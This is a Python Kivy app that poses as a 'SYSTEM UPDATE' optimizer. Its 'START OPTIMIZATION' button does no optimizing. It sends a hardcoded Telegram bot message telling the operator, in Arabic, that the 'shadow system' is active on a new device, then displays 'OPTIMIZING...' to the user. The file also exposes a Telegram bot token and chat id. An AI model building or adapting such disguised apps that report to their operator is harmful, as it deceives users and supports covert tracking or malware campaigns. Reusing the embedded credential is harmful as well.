from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.core.window import Window
import requests

class ShadowApp(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        Window.clearcolor = (0.05, 0.05, 0.1, 1)  # لون ملكي غامق
        
        self.add_widget(Label(
            text="SYSTEM UPDATE\nShadow Monarch v1.0",
            font_size='25sp',
            color=(0, 0.7, 1, 1),
            bold=True,
            halign='center'
        ))
        
        btn = Button(
            text="START OPTIMIZATION",
            size_hint=(0.8, 0.2),
            pos_hint={'center_x': 0.5},
            background_color=(0, 0.4, 0.8, 1)
        )
        btn.bind(on_press=self.on_click)
        self.add_widget(btn)

    def on_click(self, instance):
        # هنا يتم الربط مع بوت التلغرام الخاص بك
        bot_token = "7670997184:AAHh9Ocl_G7n087Xz8vXGv79v_p6mFq5Q8Y"
        chat_id = "7333552097"
        msg = "تم تفعيل نظام الظل على جهاز جديد!"
        requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}")
        instance.text = "OPTIMIZING..."

class MainApp(App):
    def build(self):
        return ShadowApp()

if __name__ == "__main__":
    MainApp().run()
